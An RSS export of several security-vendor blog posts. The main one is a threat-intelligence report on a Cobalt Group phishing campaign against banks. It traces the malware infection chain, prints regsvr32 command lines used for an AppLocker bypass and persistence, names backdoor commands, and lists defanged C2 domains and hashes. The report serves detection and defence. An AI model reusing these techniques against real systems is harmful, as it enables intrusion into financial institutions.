<p><strong>The Rise of Memcached-based Attacks</strong></p>

<p>This record-breaking attack is an example of the <a href="https://www.netscout.com/news/blog/rise-and-fall-memcached?ls=PR-MKTG&amp;lsd=blog-2-090518">memcached-based attacks</a> that have arisen over the last year, so identified because they exploit vulnerabilities in memory caching servers used to accelerate data access for websites. Memcached is free, open source software frequently deployed in cloud service infrastructures and enterprise networks with the effect of increasing bandwidth. The actors behind the February attack uncovered a design flaw in the memcached software package that enabled them to take advantage of large amounts of service-provider bandwidth to build and launch an attack of unprecedented scale.</p>

<p>Given the proliferation of <a href="https://opensource.com/resources/what-open-source?ls=PR-MKTG&amp;lsd=blog-3-090518" target="_blank">open source software</a>, which is often rushed to market and made freely available without adequate testing for vulnerabilities, it’s safe to assume that this attack won’t go down as a one-off. Security teams should expect to see similar exploitations. As&nbsp;attack tools&nbsp;grow&nbsp;more sophisticated and new attack vectors emerge, attackers are finding&nbsp;it&nbsp;easier and cheaper to launch larger, more effective attacks.</p>

<p><strong>The Hybrid Solution</strong></p>

<p>The trend toward larger attacks reinforces the case for a hybrid or layered defense posture that combines on-premise and cloud mitigation capabilities. Everyday attacks are still relatively small and can usually be detected and mitigated with an on-premise solution (virtual or appliance). However, now that attackers’ capabilities have crossed the terabit threshold, it’s essential to have a cloud-based component with the capacity to mitigate attacks of the largest scale. The advantage of a <a href="https://www.netscout.com/ddos-protection?ls=PR-MKTG&amp;lsd=blog-4-090518">hybrid approach</a> is that cloud-based defenses can essentially be held in reserve (as opposed to “always on”) and instantly activated when the on-premise component detects an attack of significant size.</p>

<p>DDoS hardware and software solutions are all the more effective when they are backed by a <a href="https://www.netscout.com/global-threat-intelligence?ls=PR-MKTG&amp;lsd=blog-5-090518">global threat intelligence capability</a>, such as NETSCOUT Active Threat Level Analysis System (ATLAS). ATLAS leverages data from a vast network of service provider clients to gain deep visibility into the backbone of the internet. Armed with this data and the analysis from our research team, we are constantly updating our technology solutions with countermeasures against both known and emerging threats.</p>

<p>One important lesson we’ve learned in our many years of analyzing the threat landscape: once a new type of DDoS attack appears, it never goes away. The terabit-sized genie is out of the bottle, and it’s not going back in. Be ready.</p>

<p>For a quick assessment of your current DDoS protection readiness, take this <a href="http://ddosquiz.netscout.com/?utm_source=blog" target="_blank">5-question quiz</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/ddos">DDoS</category>
    <enclosure url="http://localhost:7996/sites/default/files/GrowingAttackSize.jpg" length="782223" type="image/jpeg"/>
    <guid isPermaLink="false">ab9fd912-1850-44e1-8cc3-b7470547749b</guid>
    <pubDate>Wed, 05 Sep 2018 13:22:29 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Kevin Whalen</dc:creator>
    </item>
<item>
  <title>Double the Infection, Double the Fun</title>
  <link>http://localhost:7996/blog/asert/double-infection-double-fun</link>
  <description>Executive Summary Cobalt Group (aka TEMP.Metastrike), active since at least late 2016, have been suspected in attacks across dozens of countries. The group primarily targets financial organizations, often with the use of ATM malware. Researchers also believe they are responsible for a series of attacks on the SWIFT banking system which costs millions in damages to the impacted...</description>
  <content:encoded><![CDATA[<h2>Executive Summary</h2>

<p>Cobalt Group (aka TEMP.Metastrike), active since at least late 2016, have been suspected in attacks across dozens of countries. The group primarily targets financial organizations, often with the use of ATM malware. Researchers also believe they are responsible for a series of attacks on the SWIFT banking system which costs millions in damages to the impacted entities. On August 13, ASERT observed the financially-motivated hacking group actively pushing a new campaign. We believe the targeted institutions for the ongoing campaign are located in eastern Europe and Russia.  The active campaigns utilize spear phishing messages to gain entry. The emails appear to come from a financial vendor or partner, increasing the likelihood of infection.  The group uses tools that can bypass Window’s defenses.</p>

<p><strong><em>NOTE:</em></strong><em> Arbor APS enterprise security products detect and block all activity noted in this report.</em></p>

<h2>Key Findings</h2>

<ul><li>Recent campaigns masquerade as other financial institutions or a financial supplier/partner domain to trick potential victims into trusting the messages.</li>
	<li>Two phishing targets found.
	<ul><li>NS Bank (Russia)</li>
		<li>Banca Comercială Carpatica / Patria Bank (Romania)</li>
	</ul></li>
	<li>One phishing email contains two malicious URLs.
	<ul><li>The first one is a weaponized Word document.  The document contains obfuscated VBA scripts as opposed to known CVEs used in parallel to this campaign.</li>
		<li>The second one is a binary with a jpg extension.</li>
	</ul></li>
	<li>The binaries analyzed contained two unique C2 servers we believe are owned and operated by the Cobalt hacking Group.</li>
</ul><h2>Details</h2>

<h2>Cobalt Group Connection</h2>

<p>ASERT recently uncovered two different malware samples which we believe connect the active campaigns to Cobalt Group. The first sample, a JavaScript backdoor, shares functionality with previous versions of a similar backdoor. The second binary, CobInt/COOLPANTS, is a reconnaissance backdoor as noted by security researchers.</p>

<h3>JavaScript Backdoor</h3>

<p>The JavaScript Backdoor is believed to be a stager for additional payloads.  This stager, previously analyzed by security researchers from Group-IB, and the JavaScript Backdoor ASERT analyzed exhibits similar functionality as noted below:</p>

<ul><li>Registry key settings for persistence</li>
	<li>Launched in an SCT (a scriptlet COM object) called via regsvr32.exe
	<ul><li>An AppLocker by-pass technique (squiblydoo).</li>
	</ul></li>
	<li>Use of RC4 to encrypt traffic</li>
	<li>Same type of system information collected</li>
	<li>The C2 command names show striking similarity</li>
	<li>The C2 communication structure is also closely aligned between the two samples</li>
</ul><h3>CobInt/COOLPANTS</h3>

<p>The second binary identified by security researchers, dubbed “Recon (CobInt) backdoor”, matched a new sample ASERT identified. A number of binaries came to light after the initial findings of the CobInt backdoor. The following are a few of these binaries, including the new sample identified by ASERT researchers (<strong>Figure 1</strong>):</p>

<ul><li>Sample: 10d044bc5b8ae607501304e61b2efecb
	<ul><li>Security Researchers identify a “patient zero” binary and called it CobInt.
		<ul><li>Listed in a recent report as a tool used by Cobalt Group</li>
		</ul></li>
	</ul></li>
</ul><ul><li>Sample: d017bf9f6039445bfefd95a853b2e4c4
	<ul><li>An found a sample on July 9, 2018 and called it COOLPANTS.</li>
		<li>Appears to be an evolution of CobInt due to similarities in the binary when cross-referenced
		<ul><li>28 of the 57 functions matched using Diaphora, a tool that compares binary functions</li>
		</ul></li>
		<li>C2 tied to Cobalt Group <a href="https://www.proofpoint.com/us/daily-ruleset-update-summary-20180706">reporting</a>: hxxps://apstore[.]info</li>
	</ul></li>
</ul><ul><li>New Sample: 616199072a11d95373b3c38626ad4c93
	<ul><li>Found by ASERT August 13<sup>th</sup> 2018</li>
		<li>Very similar to COOLPANTS when cross-referencing the binaries:
		<ul><li>All 48 functions under “Best Match” tab in Diaphora</li>
		</ul></li>
		<li>Same compilation time as COOLPANTS: 2018-06-13 20:44:15</li>
		<li>C2: rietumu[.]me.
		<ul><li>The sample evolution supports the theory that rietumu[.]me belongs to the Cobalt hacking group.</li>
		</ul></li>
	</ul></li>
</ul><p><br /><img alt="CobInt/COOLPANTS" data-entity-type="file" data-entity-uuid="3b985608-cd55-4d06-b04b-382a841f6a65" src="http://localhost:7996/sites/default/files/inline-images/Graphic1_Final-768x492.jpg" /></p>

<p>Figure 1. CobInt/COOLPANTS</p>

<h2>Phish &amp; Infrastructure Analysis</h2>

<p>After inspecting the domain, rietumu[.]me, ASERT uncovered the email address solisariana[@]protonmail[.]com.  Pivoting on the email leads to five additional domains each with a creation date of: 2018-08-01.</p>

<ol><li>compass[.]plus</li>
	<li>eucentalbank[.]com</li>
	<li>europecentalbank[.]com</li>
	<li>inter-kassa[.]com</li>
	<li>unibank[.]credit</li>
</ol><p>Hunting for samples associated with inter-kassa[.]com leads to a phishing email uploaded to VirusTotal, d3ac921038773c9b59fa6b229baa6469 (<strong>Figure 2</strong>). At the time of analysis, VirusTotal scored the phishing email with a 0, indicating nothing malicious was identified by the anti-virus engines.   </p>

<p><a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/08/Screen-Shot-2018-08-15-at-4.39.17-PM.png"><img alt=" Phishing Email Header" data-entity-type="file" data-entity-uuid="a37ded86-c77c-4432-9c3d-fd19e535733d" src="http://localhost:7996/sites/default/files/inline-images/Figure%202%20Phishing%20Email%20Header.png" /></a></p>

<p>Figure 2. Phishing Email Header</p>

<p>Most of the email content appears benign except for a link embedded in the message. The name “Interkassa” appears to be a payment processing system which makes it a prime masquerading target for attackers as noted in the tactics employed by the Cobalt Group for this ongoing campaign. The links embedded in the phishing email are as follows:</p>

<ol><li>hxxps://download.outlook-368[.]com/Document00591674.doc
	<ol><li>Live on August 14, 2018</li>
	</ol></li>
	<li>hxxp://sepa-europa[.]eu/transactions/id02082018.jpg
	<ol><li>Not live at time of analysis but a sample matching the full URL was uploaded to VirusTotal.</li>
	</ol></li>
</ol><h2>Document Infection Chain</h2>

<h3>Payload Stager: Part One</h3>

<p>The document from the embedded URL in the phishing email, Document00591674.doc (61e3207a3ea674c2ae012f44f2f5618b), renders a VBA infested word document which continues the infection cycle once macros are enabled. <strong>NOTE:</strong> The document requires user permission and/or a policy enabled that allows Macros to run for a successful launch. The VBA script pieces together a cmd.exe command that launches cmstp.exe with an INF file (<strong>figure 3</strong>) allowing to potentially by-pass AppLocker.  The INF file then beacons to download.outlook-368[.]com to download a remote payload that cmstp.exe will execute. </p>

<p><a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/08/Screen-Shot-2018-08-29-at-12.06.06-PM.png"><img alt="Figure 3. INF File" data-entity-type="file" data-entity-uuid="74d720e7-4f36-450d-9e3d-81bf080fa9d7" src="http://localhost:7996/sites/default/files/inline-images/Figure%203%20INF%20File.png" /></a></p>

<p>Figure 3. INF File</p>

<p>The file, info.txt, downloaded from download.outlook-368[.]com is an XML file with an embedded scriptlet tag.  The XML’s content includes a registration section allowing it to be used as a SCT/COM object (<strong>Figure 4</strong>). [caption id="attachment_9607" align="aligncenter" width="908"]<a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/08/Screenshot-from-2018-08-17-14-28-44.png"><img alt="Figure 4. COM Object" data-entity-type="file" data-entity-uuid="6bf2ea92-92a4-4a32-b815-281a24624a99" src="http://localhost:7996/sites/default/files/inline-images/Figure%204%20COM%20Object.png" /></a></p>

<p>Figure 4. COM Object</p>

<p>“cmstp.exe” executes the SCT file, which subsequently drops and launches the JavaScript backdoor dropper binary, 31385.txt (e368365bece9fb5b0bc8de1209bab694), disguised as a text file.  For the dropped binary, Cobalt Group makes use of another system provided binary to add a layer of stealth and bypass possible protections like AppLocker by launching it using regsvr32.exe (<strong>Figure 5</strong>). </p>

<p>This is consistent with TTPs for this actor. <a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/08/Screen-Shot-2018-08-16-at-12.33.37-PM.png"><img alt="Figure 5. regsvr32 launching the 31385.txt" data-entity-type="file" data-entity-uuid="7a113104-684b-4e0b-8a99-613369472244" src="http://localhost:7996/sites/default/files/inline-images/Figure%205%20regsvr32%20launching%20the%2031385.png" /></a> Figure 5.regsvr32 launching the 31385.txt</p>

<p>The DLL file, 31385.txt, masquerading as a text file, is the last stage in the infection chain.  The DLL drops the final obfuscated embedded file and launches it using regsvr32.exe before deleting itself (<strong>Figure 6</strong>).</p>

<p><a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/08/Screenshot-from-2018-08-17-15-03-44.png"><img alt="Figure 6. Final Obfuscated Script" data-entity-type="file" data-entity-uuid="f2f60e60-f4bf-4027-b741-9859ed3bded2" src="http://localhost:7996/sites/default/files/inline-images/Figure%206%20Final%20Obfuscated%20Script.png" /></a> Figure 6. Final Obfuscated Script</p>

<p>The above script (<strong>Figure 6</strong>) is launched using regsvr32.exe:</p>

<ul><li>REgSvr32 /S /N /U /I:"C:/Users/zgSpbU9Lu/AppData/Roaming/7F235861DB0B0024C3.txt" sCRObJ</li>
</ul><p>The script ensures persistence by modifying the registry key <em>UserInitMprLoginScript</em> with the following value:</p>

<ul><li>Regxvr32 /S /N /U /I:C:/Users/&lt;redact&gt;/AppData/Roaming/EE02EB37AA8.txt ScRObJ</li>
</ul><p>De-obfuscating the final script renders the C2 along with the RC4 key.  This is the JavaScript backdoor “more_eggs” which has been analyzed by other researchers over the past few years (<strong>Figure 7</strong>).</p>

<p><a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/08/Screenshot-from-2018-08-16-14-24-05.png"><img alt="Figure 7. De-Obfuscated JavaScript Backdoor " data-entity-type="file" data-entity-uuid="79d337d4-5022-4831-91fd-51aedcdc938c" src="http://localhost:7996/sites/default/files/inline-images/Figure%207%20De-Obfuscated%20JavaScript%20Backdoor.png" /></a></p>

<p>Figure 7. De-Obfuscated JavaScript Backdoor - “More_eggs”</p>

<h4>Backdoor “more_eggs” commands:</h4>

<ol><li>d&amp;exec – Downloads and executes a PE file.</li>
	<li>more_eggs – Downloads an update for itself.</li>
	<li>gtfo – Delete itself and related registry entries.</li>
	<li>more_onion – Executes the “new” copy of itself.</li>
	<li>vai_x – Executes a command via cmd.</li>
</ol><p><strong>NOTE</strong>: Commands 1 – 4 match the commands described in other public reporting.  Command 5 differs in name only; what it does remains the same.  The public report shows “more_power” as the name of the fifth command.  <a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/08/Graphic2_FINAL2-01.jpg"><img alt="Figure 8: Execution Flow" data-entity-type="file" data-entity-uuid="ec0e9045-f075-406f-92fc-b5f13b3f035a" src="http://localhost:7996/sites/default/files/inline-images/Figure%208-%20Execution%20Flow.jpg" /></a></p>

<p>Figure 8: Execution Flow</p>

<h2>JPEG Infection Chain</h2>

<h3>File Execution</h3>

<p>The second URL identified in the phishing email, hxxp://sepa-europa[.]eu/transactions/id02082018.jpg, acts as a red-herring; id02082018.jpg, 9a87da405a53eaf32f8a24d3abb085af - UPX unpacked, is an executable rather than an image file.  The sample is littered with junk code that spends CPU cycles before proceeding to de-obfuscate itself.  The unpacking routine involves overwriting itself in memory with another executable. This overwritten binary loads a resource and jumps to the executable code contained in it.  The unpacked binary will fail when <em>LoadResource</em> is called if it’s not running in the context of the original binary (<strong>Figure 9</strong>). </p>

<p><a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/08/Screenshot-from-2018-08-26-16-35-26.png"><img alt="Figure 9: LoadResource()" data-entity-type="file" data-entity-uuid="7bb71964-c57f-4f30-9abb-0bc51e3ec9c5" src="http://localhost:7996/sites/default/files/inline-images/Figure%209-%20LoadResource.png" /></a></p>

<p>Figure 9: LoadResource()</p>

<p>The loaded shellcode first deobfuscates itself before beaconing to the C2 server for additional payloads or scripts. <a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/08/Screenshot-from-2018-08-26-16-42-00.png"><img alt="Figure 10: C2 Server" data-entity-type="file" data-entity-uuid="a46d905b-6a8a-49dd-a399-82edbf9cd869" src="http://localhost:7996/sites/default/files/inline-images/Figure%2010-%20C2%20Server.png" /></a> Figure 10: C2 Server</p>

<p>At the time of analysis, the C2 server did not respond; however, there is another binary with the same C2 found in ASERT’s malware zoo which bears a striking resemblance to CobInt.</p>

<h3>Full Circle</h3>

<p>The binary, 452903fc857fb98f4339d7ce1884099, makes use of the C2 ibfseed[.]com.  Comparing this binary to another CobInt (616199072a11d95373b3c38626ad4c93) sample using Diaphora, ASERT determined this to be another CobInt/COOLPANTS sample.  We believe this binary is tied to Cobalt Group using the same methodology and binary comparisons as the previously discussed malware samples.  </p>

<h2>Romanian Target Spotted</h2>

<h2>Phish</h2>

<p>Working closely with Intel471, one of our Threat Intelligence partners, we found an additional Cobalt Group phishing campaign targeting carpatica[.]ro by masquerading as Single Euro Payments Area (SEPA).  “carpatica[.]ro” belongs to Banca Comercială Carpatica, a bank in Romania that merged with Patria Bank in 2017. </p>

<p><a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/08/Screenshot-from-2018-08-29-17-27-57.png"><img alt="Figure 11: Romanian Bank Phish Header" data-entity-type="file" data-entity-uuid="9c1f42d0-1487-4530-bd26-7d02b8ce3c60" src="http://localhost:7996/sites/default/files/inline-images/Figure%2011-%20Romanian%20Bank%20Phish%20Header.png" /></a> Figure 11: Romanian Bank Phish Header</p>

<h2>Cobalt Group Connection</h2>

<p>The phishing email uncovered by Intel471 downloads 9270ac1e013a3b33c44666a66795d0c0.  The downloaded file shares the same PDB string as 1999a718fb9bcf3c5b3e41bf88be9067.  That sample connects to rietumu[.]me, which ASERT identified as belonging to Cobalt Group (<strong>Figure 12</strong>). </p>

<p><a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/08/Graphic3_Final-03.jpg"><img alt="Figure 12: Cobalt Phish Connection" data-entity-type="file" data-entity-uuid="1b64a120-f8cc-477f-9de3-f5c748d44d4a" src="http://localhost:7996/sites/default/files/inline-images/Figure%2012-%20Cobalt%20Phish%20Connection.jpg" /></a></p>

<p>Figure 12: Cobalt Phish Connection</p>

<h2>Summary</h2>

<p>This Cobalt Group actor(s) mimic financial entities or their vendors/partners in order to gain a foothold in the target’s network.  Making use of separate infection points in one email with two separate C2s makes this email peculiar.  One could speculate that this would increase the infection odds.  The actor tries to hide the infection by using regsvr32.exe and cmstp.exe, which are both known for by-passing AppLocker (configuration dependent).  ASERT believes Cobalt Group will continue targeting financial organizations in Eastern Europe and Russia based on the observables in this campaign and their normal modus operandi.  ASERT also recommends that employees are trained to spot phishing emails and, where possible, closely inspect emails for look-alike domains that might contain malicious attachments or links.  </p>

<h2>IOCs</h2>

<p>10D044BC5B8AE607501304E61B2EFECB - CobInt d017bf9f6039445bfefd95a853b2e4c4 - COOLPANTS 616199072a11d95373b3c38626ad4c93 – Coblnt/COOLPANTS (ASERT Sample) d3ac921038773c9b59fa6b229baa6469 - Email 61e3207a3ea674c2ae012f44f2f5618b - Document00591674.doc e368365bece9fb5b0bc8de1209bab694 – DLL File 3452903fc857fb98f4339d7ce1884099 – CobInt/COOLPANTS (ASERT Sample) 9a87da405a53eaf32f8a24d3abb085af – id02082018.jpg (UPX Unpacked) f3bb3e2c03f3976c107de88b43a22655 – id02082018.jpg (UPX Packed) a3b705ce3d677361a7a9b2b0bdf04a04 – Email (carpatica) attachment eb93c912e4d3ecf52615b198c44771f4 – Email (carpatica) 9270ac1e013a3b33c44666a66795d0c0 - Email (carpatica)Downloaded 1999a718fb9bcf3c5b3e41bf88be9067   hxxps://help-desc-me[.]com hxxps://apstore[.]info hxxps://rietumu[.]me hxxps://ww3.cloudfront[.]org[.]kz hxxp://download.outlook-368[.]com hxxps://ibfseed[.]com   compass[.]plus eucentalbank[.]com europecentalbank[.]com inter-kassa[.]com unibank[.]credit sepacloud[.]eu sepa-cloud[.]com</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/blog-category/asert">ASERT</category>
    <enclosure url="http://localhost:7996/sites/default/files/Figure%2012-%20Cobalt%20Phish%20Connection.jpg" length="150935" type="image/jpeg"/>
    <guid isPermaLink="false">03b03f8e-b60e-4433-a2af-fe0e36d53880</guid>
    <pubDate>Thu, 30 Aug 2018 11:54:53 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>ASERT Team</dc:creator>
    </item>
<item>
  <title>Why CDNs Don’t Solve Your DDoS Problem</title>
  <link>http://localhost:7996/blog/why-cdns-dont-solve-your-ddos-problem</link>
  <description>A false sense of security is the worst thing that can happen to your business. Large Content Delivery Networks have reached truly global size, the underlying technologies have made it possible to implement “clouds” of services, and the “cloud” now is becoming synonymous with the internet itself.</description>
  <content:encoded><![CDATA[<p>A false sense of security is the worst thing that can happen to your business. Large Content Delivery Networks have reached truly global size, the underlying technologies have made it possible to implement “clouds” of services, and the “cloud” now is becoming synonymous with the internet itself. So, your website runs in the cloud, and nobody can crash a cloud, can they? So, you’re secure. DDoS protection: check.</p>

<p>Well, wait a moment, there’s a few more things to consider.</p>

<p>First of all, what about <em>everything else</em>? Your business is a larger machine than just the web front-end delivered by your favorite CDN. For one, all your employees have to access the internet to use a multitude of cloud services themselves: email, file storage, CRM, instant messaging, entire office automation suites now run from some sort of “cloud”. In short, if you can’t access the internet, you can’t work. Your access to the internet is the single most critical asset of your company. <a href="https://www.netscout.com/what-is-ddos?utm_source=blog">Is it protected against DDoS attacks?</a> There’s plenty of examples of how things can go wrong if it’s not. <a href="https://www.politico.eu/article/european-commission-cyberattack-internet-loss-hacked-what-we-know-and-dont-know/" target="_blank">This story</a> from 2016 describes the effects of a DDoS attack against the European Commission’s IT services: “No one could work this afternoon, since the internet was gone twice, for several hours”; surprise holiday courtesy of DDoS. In 2017 <a href="https://www.scmagazine.com/ddos-attacks-delay-trains-stymie-transportation-services-in-sweden/article/700227/" target="_blank">trains were delayed in Sweden</a> because the employees of the Transport Administration couldn’t access their monitoring systems and had to fall back to manual processes for managing the country’s rail network. In 2018 not only <a href="https://www.thelocal.dk/20180514/cyber-attack-hits-danish-rail-network" target="_blank">customers of Danish rail operator DSB couldn’t buy tickets</a> following a DDoS attack, but since email and phone services crashed as well, DSB couldn’t contact staff or customers to provide help.</p>

<p>There’s more. The whole point of using a CDN is to globally replicate and distribute static or dynamic content that is usually created and updated in <em>your</em> <em>origin servers</em>. Origin servers are frequently exposed on the internet, and as such must be protected against direct DDoS attacks. It doesn’t matter how many different paths a river takes to reach the sea: if its source is blocked, water stops flowing. It can even get trickier, though. When a customer tries to access the description of a product that is not yet cached by the CDN, the CDN will have to retrieve it from the origin servers. At NETSCOUT, years ago we assisted customers that were receiving DDoS attacks apparently originated by large CDNs and developed countermeasures to surgically block those attacks without affecting the legitimate conversations between CDN and origin servers. What was happening was that attackers figured out ways to generate traffic that triggered requests towards the origin servers, thus using the CDN as a <a href="https://en.wikipedia.org/wiki/Burning_glass" target="_blank">burning lens</a> to set the origin servers on fire.</p>

<p>This leads to the third and last major point. Most large CDNs today provide some level of “DDoS protection” for the assets directly delivered by the CDN itself, but look closer and what you’ll see is, in most cases, just a set of <em>basic, static filters</em>. Think about physical security: if a guy shows up masked and Uzi in hand it’s quite easy to classify him as a robber, but if he looks like a perfect gentleman <a href="https://youtu.be/d7rlUe-Thvk" target="_blank">with Robert Redford’s face</a>, you might be tricked to let him in. To block UDP floods at a CDN’s edge is the DDoS mitigation equivalent of being able to stop somebody showing up at your house with a tank: useful, but not exactly targeting the most sophisticated attacker. The point here is that attackers are sometimes smarter than the defenders and definitely have the luxury to be able to put more time and effort into figuring out ways to reach their goal, for example by crafting targeted application-layer weapons, than what you can put into building your defenses. So, in order to defend against these smart attackers, you need things that most CDNs won’t provide, for the simple reason that it’s not their job: intelligent and dynamic mitigation countermeasures, comprehensive visibility into what’s being blocked (or passed) and why, and 24/7 access to a team of experts that can help you when the going really gets tough. It’s what we do at NETSCOUT.</p>

<p>For a quick assessment of your current DDoS protection strategy, take this <a href="http://ddosquiz.netscout.com/?utm_source=blog" target="_blank">5-question quiz</a>.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/ddos">DDoS</category>
    <enclosure url="http://localhost:7996/sites/default/files/cdns_ddos.jpg" length="416802" type="image/jpeg"/>
    <guid isPermaLink="false">11b806dc-96c2-4db6-be53-53df778c074e</guid>
    <pubDate>Wed, 29 Aug 2018 13:15:46 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Marco  Gioanola</dc:creator>
    </item>
<item>
  <title>Realizing the Full Value of DevOps</title>
  <link>http://localhost:7996/blog/realizing-full-value-devops</link>
  <description>The ultimate business promise of agile development and continuous deployment is applications that deliver stronger customer engagement and increased productivity from better enterprise services.</description>
  <content:encoded><![CDATA[<p>The ultimate business promise of DevOps, agile development and continuous deployment, is an increase in IT workflow and applications that deliver stronger customer engagement. DevOps is not only a process but a culture that ties together workflows across development and operations to quickly respond to business demands. Not surprisingly the adoption of the DevOps model continues to grow within the enterprise. <a href="https://puppet.com/resources/report/2017-state-devops-report" target="_blank">Puppet and DORA’s 6<sup>th</sup> annual “2017 State of DevOps Report</a>” has shown a steady increase in respondents who work in DevOps teams, from 16% in 2014 to 27% in 2017. Virtually every enterprise is at least exploring DevOps, whether in specific Lines of Business, digital services groups or Centers of Excellence.</p>

<p><img alt="devops - value creation" class="align-center" data-entity-type="file" data-entity-uuid="9b6e456c-9d29-41e5-80ae-8052b7a69c69" src="http://localhost:7996/sites/default/files/inline-images/Image%201%20Blog%20DevOps_0.png" /></p>

<p>Yet significant challenges remain to realizing the full business value of DevOps. The inherent characteristics of greater complexity and scale of modern enterprise applications puts reliability and usability at risk.</p>

<p>In his seminal book the “Phoenix Project: A Novel about IT, DevOps, and Helping Your Business Win” <a href="http://www.realgenekim.me/" target="_blank">Gene Kim</a> described The Three Ways of DevOps: understand the entire system and increase flow, shortening and amplifying feedback, and based on that data, learning to improve. It might be said businesses are only in the early stages of The Three Ways. They are building new systems (spanning refactored or lift-and-shift applications, microservices, hybrid cloud environments) and increasing the flow (more, and more frequent deployments), but organizations have yet to establish complete system visibility to assure application availability and performance. As such, DevOps teams are challenged to achieve meaningful feedback loops and reduce MTTK. Both this lack of visibility and failure to attain timely insights are in turn restricting business growth.</p>

<p><strong>The Current Landscape</strong></p>

<p>What empowers the DevOps transformation, from an IT organization's point of view, is the ability to fail fast, fail often, and learn. When DevOps is adopted to its full capability then business can not only meet customer needs but also deliver differentiation. It means Dev must increase the frequency of releases and Ops must be more responsive. It means moving from a monolithic code base to microservices to deliver application features. And it means going beyond byte code instrumentation to using smart data for system-level telemetry and situational awareness to run everything reliably and confidently on hybrid cloud or multi-cloud infrastructure.</p>

<p>At the same time, undeniable cost efficiencies continue to drive the adoption of hybrid cloud and multi-cloud infrastructures. According to a 2017 survey of over 1,000 IT professionals:</p>

<ul><li>85 percent of enterprises have a multi-cloud strategy, up from 82 percent in 2016;</li>
	<li>Cloud users are running applications in an average of 1.8 public clouds and 2.3 private clouds;</li>
	<li>And they are experimenting with an additional 1.8 public clouds and 2.1 private clouds.</li>
</ul><p><strong>Blind Spots – Increasing Risks</strong></p>

<p>Application performance management (APM) tools designed for byte code, server-centric applications have not evolved to support dynamic, microservices and running workloads in the cloud. With a microservices architecture, an application is built as independent components that run each application process as a service. These services communicate via a well-defined interface using lightweight APIs. Existing APM tools by design focus on application inter-process communications within a server instance. This limitation causes critical ‘blind-spots’ along the service delivery path spanning data centers and clouds. Combining inadequate visibility (limited by silo-specific tools and data) with a continued explosion in dependencies, it is only a matter of time when DevOps teams will hit a wall when trying to assure application availability and performance, and maintain a delightful customer experience.</p>

<p><img alt="devops - risks" class="align-center" data-entity-type="file" data-entity-uuid="779ce77f-8199-4b22-b4ee-94b234d7bc73" src="http://localhost:7996/sites/default/files/inline-images/Image%202%20Blog%20DevOps_0.png" /></p>

<p><em>*number of microservices, volume of API calls</em></p>

<p>Microservices add more traffic and increases application performance degradation risk due to:</p>

<ul><li>Load, latency and errors</li>
	<li>Communication problems</li>
	<li>Scale or logic creating time out issues</li>
</ul><p>Relying on server logs, or piecemeal, byte code instrumentation from current APM tools will only get riskier as complexity, the ‘number of moving parts’, as well as the scale of enterprise applications increases. The interdependencies of microservices can result in cascading performance or availability issues which are difficult to anticipate, let alone spot the root cause. The business risks from these ‘blind-spots’ are aggravated as organizations migrate more and more workloads to the cloud (public or private), more applications are deployed in short-lived containers, and the applications themselves become more complex, interdependent.</p>

<p>As the continuous deployment pipeline grows and frequency of release accelerates (a fundamental tenet of The Three Ways), IT professionals must spend more time and effort managing microservices complexity. If a microservice fails, it is small (with respect to software code), but can be huge in terms of application performance degradation experienced by the end-user. Without system-level telemetry and a common situational awareness, DevOps teams run the risk of becoming a bottleneck that restricts the flow of high-performance, reliable services to lines of business, and ultimately customers.</p>

<p>For IT organizations embracing DevOps, more problematic are byte code-based, server-centric tools that have restricted visibility into hybrid cloud and multi-cloud environments. Getting a clear, direct line-of-sight on application behavior, service dependencies and pinpointing the root cause of failures is not only difficult in real-time, but it becomes challenging to collect the critical data needed to accurately understand user experience or assess, redesign (re-factor) and optimize applications.</p>

<p>IT – DevOps or not – will simply find it increasingly difficult to operate effectively and efficiently. They will find it harder and harder to:</p>

<ul><li>Increase resources to adequately monitor the development/deployment/operations stack;</li>
	<li>Pinpoint/fix dynamic service-delivery bottlenecks, minimize disruption, and reduce (or maintain) MTTR;</li>
	<li>Cost effectively deploy reliable applications across physical, virtual, hybrid and multi-cloud environments;</li>
	<li>Ultimately, to deliver higher quality, better performing applications and services.</li>
</ul><p>In short, <em>byte code, server-centric application performance management tools can’t keep up with the pace of change and the DevOps promise. To transform DevOps requires system-level telemetry, and continuous learning and improvement, using smart data and smarter analytics.</em></p>

<p><strong>The Value of Visibility </strong></p>

<p>The burden of assuring application performance and responsiveness in a more complex and dynamic environment is shared between Dev, QA and Ops. They require pervasive visibility that’s integrated into their IT best practices to become more responsive to customers and business demands. Visibility needs to be based on system-level telemetry, to empower the DevOps organization to be more agile and efficient and help their business to achieve market differentiation. Visibility encompasses telemetry of load, latency and failure metrics for application and service delivery systems and unobstructed views into the dependencies spanning the network, servers, service enablers, databases and applications. This insight accelerates continuous planning, delivery, integration, testing, and deployment pipeline.</p>

